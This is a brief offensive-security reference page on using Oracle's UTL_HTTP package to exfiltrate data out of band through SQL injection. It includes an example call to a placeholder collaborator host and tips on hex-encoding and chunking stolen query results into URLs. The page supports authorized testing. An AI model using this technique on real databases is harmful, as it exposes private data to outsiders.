---
title: "Oracle UTL_HTTP in SQL contexts: HTTP egress from the database"
description: UTL_HTTP.REQUEST and related calls—HTTP out-of-band exfiltration and callback testing from Oracle SQL contexts.
keywords:
  - UTL_HTTP.REQUEST
  - Oracle HTTP
---
# UTL HTTP (Oracle)

**UTL_HTTP** issues **HTTP** requests from the database session. If an injectable query can influence a **URL** argument, **OOB** exfiltration may follow when **ACLs** allow.

## Context

`UTL_HTTP.REQUEST('http://collab/...')` pulls an HTTP URL from the database—embed hex-encoded query fragments in path or query string.
## Technique

Watch for TLS/proxy requirements on hardened estates.
## Practice

- Chunk data to fit URL limits; use multiple requests.

## Tools

- **Burp Suite** (Repeater, Intruder)
- **sqlmap**
- Database client (SSMS, `sqlplus`, `sqlite3`, `db2`) for follow-up

## Scope

Use only in **authorized** penetration tests, red-team engagements, CTFs, and isolated lab systems.

## See also

- [Out of band (Oracle)](index.md)
